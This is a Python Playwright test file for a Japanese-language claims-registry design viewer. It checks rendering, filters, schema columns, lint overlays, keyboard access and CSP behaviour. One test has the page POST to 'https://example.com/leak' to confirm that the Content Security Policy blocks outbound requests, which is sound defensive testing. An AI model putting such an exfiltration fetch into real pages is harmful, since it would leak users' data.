# -*- coding: utf-8 -*-
"""Open the design-document viewer (docs/claims/, #36) in headless Chromium.

  pip install playwright && python -m playwright install chromium
  python -m pytest -q tools/tests/test_claims_viewer_ui.py
  CLAIMS_VIEWER_EVIDENCE=research/claims-viewer python -m pytest -q tools/tests/test_claims_viewer_ui.py   # also save screenshots and the network log

Skipped when Playwright or its browser is not installed (CI: .github/workflows/trace.yml has no browser).
docs/ is served by a local HTTP server, as GitHub Pages serves it (the slide viewer at /, this viewer at /claims/).
Checks: every screen renders without a script error or CSP violation; the filters; every column of the registry
schema is on the detail screen of every row of scenarios A and B; slide:<id> opens that slide; lint findings are
overlaid; keyboard use; and that opening local files makes no network request at all.
"""
import csv
import functools
import http.server
import json
import os
import pathlib
import socketserver
import threading
import unittest

import yaml

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
DOCS = os.path.join(ROOT, 'docs')
EVIDENCE = os.environ.get('CLAIMS_VIEWER_EVIDENCE')
try:
    from playwright.sync_api import sync_playwright
except ImportError:  # pragma: no cover
    sync_playwright = None


def load_yaml(rel):
    with open(os.path.join(ROOT, rel), encoding='utf-8') as f:
        return yaml.safe_load(f)


def claim_columns():
    with open(os.path.join(ROOT, 'templates', 'registry', 'claims.schema.json'), encoding='utf-8') as f:
        return list(json.load(f)['$defs']['claim']['properties'])


class _Quiet(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a):
        pass


@unittest.skipIf(sync_playwright is None, 'playwright not installed')
class ClaimsViewer(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.srv = socketserver.TCPServer(('127.0.0.1', 0), functools.partial(_Quiet, directory=DOCS))
        cls.origin = f'http://127.0.0.1:{cls.srv.server_address[1]}'
        cls.base = cls.origin + '/claims/'
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()
        cls.pw = sync_playwright().start()
        try:
            cls.browser = cls.pw.chromium.launch()
        except Exception as e:  # browser not installed
            cls.pw.stop()
            cls.srv.shutdown()
            raise unittest.SkipTest(f'chromium not available: {e}')
        if EVIDENCE:
            os.makedirs(os.path.join(ROOT, EVIDENCE), exist_ok=True)

    @classmethod
    def tearDownClass(cls):
        cls.browser.close()
        cls.pw.stop()
        cls.srv.shutdown()

    def open(self, hash_='', width=1360):
        ctx = self.browser.new_context(viewport={'width': width, 'height': 900})
        pg = ctx.new_page()
        pg.problems, pg.requests = [], []
        pg.on('pageerror', lambda e: pg.problems.append('pageerror: ' + str(e)))
        pg.on('console', lambda m: pg.problems.append(f'console {m.type}: {m.text}') if m.type in ('error', 'warning') else None)
        pg.on('request', lambda r: pg.requests.append({'method': r.method, 'url': r.url, 'type': r.resource_type}))
        pg.goto(self.base + hash_)
        pg.wait_for_selector('main h1')
        self.addCleanup(ctx.close)
        return pg

    def go(self, pg, hash_, h1=None):
        pg.evaluate('h => { location.hash = h; }', hash_)
        if h1:
            pg.wait_for_function('t => (document.querySelector("main h1") || {}).textContent.includes(t)', arg=h1)
        else:
            pg.wait_for_timeout(100)

    def shot(self, pg, name):
        if EVIDENCE:
            pg.screenshot(path=os.path.join(ROOT, EVIDENCE, name + '.jpg'), type='jpeg', quality=70, full_page=False)

    # ------------------------------------------------------------------
    def test_every_screen_renders(self):
        pg = self.open('#/scenario-a/overview')
        screens = [('#/scenario-a/overview', 'シナリオ A'), ('#/scenario-a/claims', 'クレームの一覧'),
                   ('#/scenario-a/claim/C-tenant-id', 'C-tenant-id'), ('#/scenario-a/tokens', 'トークン目録'),
                   ('#/scenario-a/token/AT', 'AT'), ('#/scenario-a/profile', '発行方式'), ('#/scenario-a/hops', 'ホップの表'),
                   ('#/scenario-a/hop/H2', 'H2'), ('#/scenario-a/lifecycle', '寿命の 4 つの層'), ('#/scenario-a/catalog', 'カタログへの回答'),
                   ('#/scenario-a/lint', 'lint の結果'), ('#/scenario-a/tables', 'そのほかの生成した表'),
                   ('#/scenario-b/overview', 'シナリオ B'), ('#/scenario-b/profile', '発行方式'), ('#/scenario-b/hops', 'ホップの表'),
                   ('#/scenario-b/lint', 'lint の結果'), ('#/trace', '対応表の進み具合'), ('#/local', '自分の YAML を開く')]
        for i, (h, title) in enumerate(screens):
            self.go(pg, h, title)
            self.shot(pg, f'{i:02d}_' + h.strip('#/').replace('/', '_'))
        self.assertEqual(pg.problems, [])
        # the generated tables of each screen are there
        self.go(pg, '#/scenario-b/lifecycle', '寿命')
        for t in ('lifecycle-token', 'lifecycle-claim', 'lifecycle-session', 'lifecycle-definition'):
            self.assertEqual(pg.locator(f'table[data-table="{t}"]').count(), 1, t)
        self.go(pg, '#/scenario-b/catalog', 'カタログ')
        heads = pg.locator('table[data-table="catalog-out-of-scope"] thead th').all_inner_texts()
        self.assertIn('前提が崩れる条件', heads)
        n_out = sum(1 for a in load_yaml('templates/examples/scenario-b/catalog_answers.yaml')['answers'] if a['answer'] == '対象外')
        self.assertEqual(pg.locator('table[data-table="catalog-out-of-scope"] tbody tr').count(), n_out)
        self.go(pg, '#/scenario-b/profile', '発行方式')
        eff = pg.locator('[data-effect="E-dpop"]')
        self.assertEqual(eff.count(), 1)
        self.assertIn('満たす', eff.inner_text())
        self.assertIn('C-cnf', eff.inner_text())
        self.go(pg, '#/scenario-b/hops', 'ホップ')
        self.assertGreater(pg.locator('table[data-table="narrowing"] tbody tr').count(), 5)
        self.assertEqual(pg.problems, [])

    def test_slide_page_still_works_and_slide_links_open_the_slide(self):
        pg = self.open('#/scenario-a/claim/C-iss')
        with open(os.path.join(DOCS, 'slide_ids.csv'), encoding='utf-8') as f:
            n = {r['id']: r['n'] for r in csv.DictReader(f)}
        link = pg.locator('a[data-slide="p05-multitenancy"]').first
        self.assertEqual(link.get_attribute('href'), '../#p05-multitenancy')
        link.click()
        pg.wait_for_url(self.origin + '/#p05-multitenancy')
        pg.wait_for_selector('#pos')
        self.assertEqual(pg.inner_text('#pos'), f"{n['p05-multitenancy']} / {len(n)}")
        self.shot(pg, 'slide_link_target')

    def test_filters(self):
        claims = load_yaml('templates/examples/scenario-a/claims.yaml')['claims']
        pg = self.open('#/scenario-a/claims')
        rows = 'table[data-table="claims"] tbody tr'
        self.assertEqual(pg.locator(rows).count(), len(claims))
        pg.select_option('#f-decision', '却下')
        self.assertEqual(pg.locator(rows).count(), sum(c['decision'] == '却下' for c in claims))
        self.assertIn('decision=', pg.evaluate('location.hash'))
        pg.select_option('#f-decision', '')
        pg.select_option('#f-token', 'IDT')
        self.assertEqual(pg.locator(rows).count(), sum('IDT' in (c.get('carried_in') or []) for c in claims))
        pg.select_option('#f-token', '')
        pg.select_option('#f-pii_category', '個人情報')
        self.assertEqual(pg.locator(rows).count(), sum(c.get('pii_category') == '個人情報' for c in claims))
        pg.select_option('#f-pii_category', '')
        pg.select_option('#f-data_category', 'user.unique_id')
        self.assertEqual(pg.locator(rows).count(), sum('user.unique_id' in (c.get('data_category') or []) for c in claims))
        pg.select_option('#f-data_category', '')
        pg.select_option('#f-tier', '却下の行')
        self.assertEqual(pg.locator(rows).count(), sum(c['decision'] == '却下' for c in claims))
        pg.select_option('#f-tier', '')
        pg.select_option('#f-stage', '②')
        self.assertEqual(pg.locator(rows).count(), sum(any(w.get('stage') == '②' for w in c.get('authoritative_writer') or []) for c in claims))
        pg.click('text=絞り込みを解く')
        pg.fill('#f-q', 'tenant_id')
        found = [t.split('\t')[0] for t in pg.locator(rows).all_inner_texts()]
        self.assertIn('C-tenant-id', found)
        self.assertLess(len(found), len(claims))
        self.shot(pg, 'filter_search_tenant_id')
        # a filtered URL opens filtered
        self.go(pg, '#/scenario-a/tokens', 'トークン目録')
        self.go(pg, '#/scenario-a/claims?decision=%E5%8D%B4%E4%B8%8B', 'クレームの一覧')
        pg.wait_for_function('n => document.querySelectorAll(\'table[data-table="claims"] tbody tr\').length === n',
                             arg=sum(c['decision'] == '却下' for c in claims))
        self.assertEqual(pg.problems, [])

    def test_detail_shows_every_column_of_the_schema(self):
        cols = claim_columns()
        pg = self.open('#/scenario-a/overview')
        checked = 0
        for ds in ('scenario-a', 'scenario-b'):
            for c in load_yaml(f'templates/examples/{ds}/claims.yaml')['claims']:
                self.go(pg, f"#/{ds}/claim/{c['id']}", f"({c['id']})")
                shown = pg.eval_on_selector_all('main [data-col]', 'els => els.map(e => e.dataset.col)')
                missing = [k for k in cols if k not in shown]
                self.assertEqual(missing, [], f"{ds} {c['id']}: columns not on the detail screen")
                # every value written in the YAML is shown (not 未記入)
                empty = pg.eval_on_selector_all('main .col.empty', 'els => els.map(e => e.dataset.col)')
                self.assertEqual([k for k in empty if k in c], [], f"{ds} {c['id']}")
                checked += 1
        self.assertGreater(checked, 60)
        # Japanese headings from templates/registry/README.md
        self.go(pg, '#/scenario-b/claim/C-employee-id', '(C-employee-id)')
        self.assertIn('照合する場所', pg.inner_text('[data-col="enforced_at"] .lbl'))
        self.assertIn('読まれてはいけない相手', pg.inner_text('[data-col="confidential_from"] .lbl'))
        # lint overlay on the row (L18: a deprecated claim with consumers)
        self.assertIn('L18', pg.inner_text('[data-lint-for="C-employee-id"]'))
        self.shot(pg, 'detail_C-employee-id_lint')
        self.go(pg, '#/scenario-b/claims', 'クレームの一覧')
        self.assertIn('warn', pg.inner_text('tr[data-row="C-employee-id"]'))
        self.assertEqual(pg.problems, [])

    def test_status_is_not_shown_by_colour_only(self):
        pg = self.open('#/scenario-b/profile')
        for h in ('#/scenario-b/profile', '#/scenario-b/claims', '#/scenario-b/lint'):
            self.go(pg, h)
            texts = pg.eval_on_selector_all('main .badge', 'els => els.map(e => e.textContent.trim())')
            self.assertTrue(texts, h)
            for t in texts:
                self.assertRegex(t, r'[A-Za-z぀-ヿ一-鿿]', (h, t))  # a word, not only a coloured dot

    def test_keyboard(self):
        pg = self.open('#/scenario-a/claims')
        pg.keyboard.press('Tab')
        self.assertEqual(pg.evaluate('document.activeElement.textContent'), '本文へ移動')
        pg.locator('main h1').click()
        pg.keyboard.press('/')
        self.assertEqual(pg.evaluate('document.activeElement.id'), 'f-q')
        pg.keyboard.type('roles')
        pg.keyboard.press('Tab')
        # reach the first row link with Tab only, then open it with Enter
        for _ in range(30):
            if pg.evaluate('document.activeElement.closest("tbody") !== null'):
                break
            pg.keyboard.press('Tab')
        self.assertEqual(pg.evaluate('document.activeElement.textContent'), 'C-roles')
        pg.keyboard.press('Enter')
        pg.wait_for_function('() => location.hash === "#/scenario-a/claim/C-roles"')
        pg.wait_for_function('() => document.activeElement && document.activeElement.tagName === "H1"')
        self.assertEqual(pg.problems, [])

    def test_local_files_make_no_network_request(self):
        pg = self.open('#/local')
        initial = list(pg.requests)
        self.assertTrue(all(r['url'].startswith(self.origin + '/claims/') for r in initial), initial)
        pg.requests.clear()
        violations = []
        pg.expose_function('reportViolation', lambda v: violations.append(v))
        pg.evaluate('''() => document.addEventListener('securitypolicyviolation',
            e => window.reportViolation({directive: e.violatedDirective, blocked: e.blockedURI}))''')
        d = os.path.join(ROOT, 'templates', 'examples', 'scenario-a')
        pg.set_input_files('#local-files', [os.path.join(d, n) for n in ('claims.yaml', 'token_types.yaml', 'hops.yaml', 'catalog_answers.yaml')])
        pg.wait_for_selector('#local-open')
        self.shot(pg, 'local_01_loaded')
        pg.click('#local-open')
        pg.wait_for_function('() => location.hash === "#/local/claims"')
        claims = load_yaml('templates/examples/scenario-a/claims.yaml')['claims']
        self.assertEqual(pg.locator('table[data-table="claims"] tbody tr').count(), len(claims))
        self.shot(pg, 'local_02_claims')
        for h, title in (('#/local/claim/C-tenant-id', '(C-tenant-id)'), ('#/local/tokens', 'トークン目録'), ('#/local/hops', 'ホップ'),
                         ('#/local/catalog', 'カタログ'), ('#/local/profile', '発行方式'), ('#/local/lifecycle', '寿命')):
            self.go(pg, h, title)
        self.go(pg, '#/local/claim/C-tenant-id', '(C-tenant-id)')
        shown = pg.eval_on_selector_all('main [data-col]', 'els => els.map(e => e.dataset.col)')
        self.assertEqual([k for k in claim_columns() if k not in shown], [])
        self.shot(pg, 'local_03_detail')
        local_requests = list(pg.requests)
        self.assertEqual(local_requests, [], 'opening and reading local files must not make any request')
        # the CSP blocks a connection even if a script tried one (same origin or not)
        blocked = pg.evaluate('''async () => {
            const out = [];
            for (const u of ['https://example.com/leak', location.origin + '/claims/index.html']) {
              try { await fetch(u, {method: 'POST', body: 'x'}); out.push('sent ' + u); } catch (e) { out.push('blocked ' + u); }
            }
            return out; }''')
        pg.wait_for_timeout(200)
        self.assertTrue(all(x.startswith('blocked ') for x in blocked), blocked)
        self.assertEqual(pg.requests, [], 'the CSP must stop fetch before any request')
        self.assertEqual(sorted({v['directive'] for v in violations}), ['connect-src'])
        if EVIDENCE:
            with open(os.path.join(ROOT, EVIDENCE, 'network-log.json'), 'w', encoding='utf-8', newline='\n') as f:
                json.dump({
                    'what': 'Playwright (Chromium) network log of the design-document viewer (#36), '
                            'tools/tests/test_claims_viewer_ui.py::test_local_files_make_no_network_request',
                    'page': 'docs/claims/index.html served by a local HTTP server (as GitHub Pages serves docs/)',
                    'browser': f'chromium {self.browser.version}',
                    'csp': pg.get_attribute('meta[http-equiv="Content-Security-Policy"]', 'content'),
                    'initial_load_requests': [dict(r, url=r['url'].replace(self.origin, '<origin>')) for r in initial],
                    'local_files_opened': ['templates/examples/scenario-a/' + n for n in ('claims.yaml', 'token_types.yaml', 'hops.yaml', 'catalog_answers.yaml')],
                    'screens_visited_after_opening': ['#/local/claims', '#/local/claim/C-tenant-id', '#/local/tokens', '#/local/hops',
                                                      '#/local/catalog', '#/local/profile', '#/local/lifecycle'],
                    'requests_while_opening_and_viewing_local_files': local_requests,
                    'fetch_attempts_from_the_page': [x.replace(self.origin, '<origin>') for x in blocked],
                    'requests_made_by_those_attempts': pg.requests,
                    'csp_violations': [dict(v, blocked=v['blocked'].replace(self.origin, '<origin>')) for v in violations],
                }, f, ensure_ascii=False, indent=1)
                f.write('\n')
        self.assertEqual(pg.problems and [p for p in pg.problems if 'Content Security Policy' not in p and 'Failed to fetch' not in p], [])

    def test_local_render_bundle_and_a_broken_file(self):
        import sys
        import tempfile
        sys.path.insert(0, os.path.join(ROOT, 'tools'))
        import build_claims_viewer as bcv
        d = tempfile.mkdtemp()
        self.addCleanup(lambda: __import__('shutil').rmtree(d))
        with open(os.path.join(d, 'bundle.json'), 'w', encoding='utf-8') as f:
            json.dump(bcv.bundle_of('templates/examples/scenario-b'), f, ensure_ascii=False)
        with open(os.path.join(d, 'broken.yaml'), 'w', encoding='utf-8') as f:
            f.write('claims:\n  - id: C-x\n   name: [unclosed\n')
        pg = self.open('#/local')
        pg.requests.clear()
        pg.set_input_files('#local-files', [os.path.join(d, 'bundle.json'), os.path.join(d, 'broken.yaml')])
        pg.wait_for_selector('#local-open')
        items = pg.locator('#local-list li').all_inner_texts()
        self.assertTrue(any('render の束' in x and 'bundle.json' in x for x in items), items)
        self.assertTrue(any('読めない' in x and 'broken.yaml' in x for x in items), items)
        self.go(pg, '#/local/lint', 'lint の結果')
        self.assertIn('L18', pg.inner_text('table[data-table="ci-result"]'))
        self.go(pg, '#/local/profile', '発行方式')
        self.assertEqual(pg.locator('[data-effect="E-dpop"]').count(), 1)
        self.assertEqual(pg.requests, [])
        self.assertEqual(pg.problems, [])

    def test_trace_counts(self):
        reqs = load_yaml('templates/trace/requirements.yaml')['requirements']
        pg = self.open('#/trace')
        row = pg.locator('table[data-table="trace-tier"] tbody tr').filter(has_text='core').first.inner_text()
        done = sum(r['tier'] == 'core' and r['status'] == '実装済み' for r in reqs)
        total = sum(r['tier'] == 'core' for r in reqs)
        self.assertIn(f'（{done} / {total}）', row)

    def test_opens_from_a_file_url(self):
        # a reader who downloads the repository opens docs/claims/index.html directly (no server)
        ctx = self.browser.new_context()
        self.addCleanup(ctx.close)
        pg = ctx.new_page()
        problems = []
        pg.on('pageerror', lambda e: problems.append(str(e)))
        pg.on('console', lambda m: problems.append(m.text) if m.type == 'error' else None)
        pg.goto(pathlib.Path(DOCS, 'claims', 'index.html').as_uri() + '#/scenario-b/claims')
        pg.wait_for_function('() => document.querySelectorAll(\'table[data-table="claims"] tbody tr\').length > 0')
        self.assertEqual(problems, [])

    def test_narrow_screen(self):
        pg = self.open('#/scenario-a/claim/C-iss', width=380)
        self.assertLessEqual(pg.evaluate('document.documentElement.scrollWidth'), 380 + 1)
        self.shot(pg, 'narrow_detail')


if __name__ == '__main__':
    unittest.main()
